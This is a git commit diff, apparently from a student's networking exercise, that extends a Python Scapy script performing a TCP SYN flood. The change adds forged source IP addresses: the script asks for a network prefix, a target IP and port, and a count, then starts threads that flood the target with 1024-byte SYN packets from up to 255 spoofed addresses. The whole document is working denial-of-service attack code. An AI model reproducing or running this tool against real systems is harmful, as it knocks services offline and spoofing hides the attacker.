364efc80c8ff75ed551b93f0a11a0a45d6903247
raz42852 <razderi55@gmail.com>
2024-02-13 18:18:24 +0200

    Plus bouns(send from different ip)

--- main.py
+++ main.py
@@ -1,7 +1,8 @@
 import scapy.all as scapy
+from threading import Thread
 
-def SYN_Flooding(dstIP, dstPort):
-    ip= scapy.IP(dst=dstIP)  
+def SYN_Flooding(srcIP, dstIP, dstPort):
+    ip= scapy.IP(src=srcIP ,dst=dstIP)
     tcp = scapy.TCP(sport=scapy.RandShort(), dport=dstPort, flags="S")
     raw = scapy.Raw(b"X"*1024)
     p = ip / tcp / raw
@@ -9,8 +10,12 @@ def SYN_Flooding(dstIP, dstPort):
 
 if __name__ == "__main__":
     try:
+        perfix_network = input("Enter your prefix network (exa. '10.120.0') : ")
         dstIP = input("Enter your target IP (exa. '10.120.0.190') : ")
         dstPort = int(input("Enter your target Port (exa. '80') : "))
-        SYN_Flooding(dstIP, dstPort)
+        count_comp = int(input("Enter a number for the number of computers you want to use (1 - 255) : "))
+        for i in range(1, count_comp):
+            srcIP = f"{perfix_network}.{i}"
+            Thread(target=SYN_Flooding, args=(srcIP, dstIP, dstPort)).start()
     except:
         print("Something went wrong")
